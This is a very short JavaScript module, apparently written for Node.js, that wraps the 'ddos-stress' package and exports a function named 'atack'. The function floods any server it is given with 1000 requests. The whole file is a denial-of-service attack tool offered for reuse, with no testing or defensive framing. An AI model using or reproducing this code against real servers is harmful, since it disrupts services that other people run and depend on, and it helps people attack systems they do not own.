const ddos=require('ddos-stress')
const nedds=new ddos

const atack=function(server){
nedds.run(`${server}`,1000)}

module.exports={atack:atack}